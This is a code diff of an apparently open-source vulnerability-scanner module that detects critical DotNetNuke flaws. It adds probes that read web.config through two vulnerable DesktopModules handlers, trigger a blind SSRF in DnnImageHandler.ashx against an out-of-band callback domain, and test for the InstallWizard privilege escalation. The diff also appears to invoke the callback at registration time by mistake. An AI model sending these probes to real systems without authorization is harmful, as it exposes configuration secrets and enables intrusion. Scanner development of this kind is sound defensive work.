@@ -6,10 +6,11 @@ class dotnetnuke(BaseModule):
     DNN_signatures_body = [
         "<!-- by DotNetNuke Corporation",
         "<!-- DNN Platform",
-        "/js/dnncore.js?cdv",
+        "/js/dnncore.js",
         'content=",DotNetNuke,DNN',
         "dnn_ContentPane",
         'class="DnnModule"',
+        "/Install/InstallWizard.aspx",
     ]
     DNN_signatures_header = ["DNNOutputCache", "X-Compressed-By: DotNetNuke"]
     exploit_probe = {
@@ -21,25 +22,17 @@ class dotnetnuke(BaseModule):
     flags = ["active", "aggressive", "web-thorough"]
     meta = {"description": "Scan for critical DotNetNuke (DNN) vulnerabilities"}
 
-
-
-
-
-    def interactsh_callback(self, r):
-            
-        self.critical("INTERACTSH_CALLBACK")
-
-        # self.emit_event(
-        #     {
-        #         "severity": matched_severity,
-        #         "host": str(matched_event.host),
-        #         "url": matched_event.data,
-        #         "description": f"Out-of-band interaction: [{matched_technique}] [{r.get('protocol').upper()}] Read Response: {matched_read_response}",
-        #     },
-        #     "VULNERABILITY",
-        #     matched_event,
-        # )
-
+    def interactsh_callback(self, event):
+        self.emit_event(
+            {
+                "severity": "MEDIUM",
+                "host": str(event.host),
+                "url": event.data["url"],
+                "description": f"DotNetNuke Blind-SSRF (CVE 2017-0929)",
+            },
+            "VULNERABILITY",
+            event,
+        )
 
     async def handle_event(self, event):
         detected = False
@@ -85,13 +78,13 @@ class dotnetnuke(BaseModule):
                         )
                         return
 
-
             if "endpoint" not in event.tags:
-    
+
                 # NewsArticlesSlider ImageHandler.ashx File Read
-                result = await self.helpers.request(f'{event.data["url"]}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx?img=~/web.config', cookies=self.exploit_probe)
+                result = await self.helpers.request(
+                    f'{event.data["url"]}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx?img=~/web.config'
+                )
                 if result:
-                    self.hugewarning(result.text)
                     if "<configuration>" in result.text:
                         self.emit_event(
                             {
@@ -103,11 +96,12 @@ class dotnetnuke(BaseModule):
                             "VULNERABILITY",
                             event,
                         )
-                        return
+
                 # DNNArticle GetCSS.ashx File Read
-                result = await self.helpers.request(f'{event.data["url"]}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx?img=~/web.config', cookies=self.exploit_probe)
+                result = await self.helpers.request(
+                    f'{event.data["url"]}/DesktopModules/DNNArticle/getcss.ashx?CP=%2fweb.config&smid=512&portalid=3'
+                )
                 if result:
-                    self.hugewarning(result.text)
                     if "<configuration>" in result.text:
                         self.emit_event(
                             {
@@ -119,28 +113,39 @@ class dotnetnuke(BaseModule):
                             "VULNERABILITY",
                             event,
                         )
+
+                result = await self.helpers.request(f'{event.data["url"]}/Install/InstallWizard.aspx')
+                if result.status_code == 200:
+                    result_confirm = await self.helpers.request(
+                        f'{event.data["url"]}/Install/InstallWizard.aspx?__viewstate=1'
+                    )
+                    if result_confirm.status_code == 500:
+                        self.emit_event(
+                            {
+                                "severity": "CRITICAL",
+                                "description": "DotNetNuke InstallWizard SuperUser Privilege Escalation",
+                                "host": str(event.host),
+                                "url": f'{event.data["url"]}/Install/InstallWizard.aspx',
+                            },
+                            "VULNERABILITY",
+                            event,
+                        )
                         return
 
-
-
-
-                # SSRF /DnnImageHandler.ashx
-
-               # TODO:
-                # FIGURE OUT HOW TO MAKE INTERACTSH WORK
-                # ADD LAST DETECTION
-
-                subdomain_tag = self.parent_module.helpers.rand_string(4, digits=False)
-
+                subdomain_tag = self.helpers.rand_string(4, digits=False)
                 if self.scan.config.get("interactsh_disable", False) == False:
                     try:
                         interactsh_instance = self.helpers.interactsh()
-                        interactsh_domain = await interactsh_instance.register(callback=self.interactsh_callback)
+                        interactsh_domain = await interactsh_instance.register(
+                            callback=self.interactsh_callback(event)
+                        )
                     except InteractshError as e:
                         self.warning(f"Interactsh failure: {e}")
                         return False
 
-                    await self.helpers.request(f'{event.data["url"]}/DnnImageHandler.ashx?mode=file&url=http://{subdomain_tag}.{interactsh_domain}')
+                    await self.helpers.request(
+                        f'{event.data["url"]}/DnnImageHandler.ashx?mode=file&url=http://{subdomain_tag}.{interactsh_domain}'
+                    )
 
                     try:
                         await interactsh_instance.deregister()
@@ -151,14 +156,5 @@ class dotnetnuke(BaseModule):
                         self.warning(f"Interactsh failure: {e}")
 
                 else:
-                    self.debug(
-                        "Aborting DNNImageHandler SSRF check due to interactsh global disable"
-                    )
+                    self.debug("Aborting DNNImageHandler SSRF check due to interactsh global disable")
                     return None
-
-
-
-
-
-
-           #      /Install/InstallWizard.aspx?__VIEWSTATE
